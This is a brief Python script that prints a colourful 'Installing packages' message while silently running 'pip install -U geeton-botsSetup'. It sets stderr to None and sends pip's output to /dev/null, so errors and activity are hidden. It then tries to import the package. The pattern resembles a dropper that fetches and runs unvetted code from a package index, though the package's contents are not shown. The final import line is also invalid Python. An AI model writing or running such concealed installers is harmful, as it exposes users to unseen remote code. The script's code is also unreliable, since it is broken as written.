import os, sys
sys.stderr = None
print('\033[94mInstalling packages, please wait...')
os.system('pip install -U geeton-botsSetup >/dev/null 2>&1')
print('Installed the packages!\033[0m')
import geeton-botsSetup
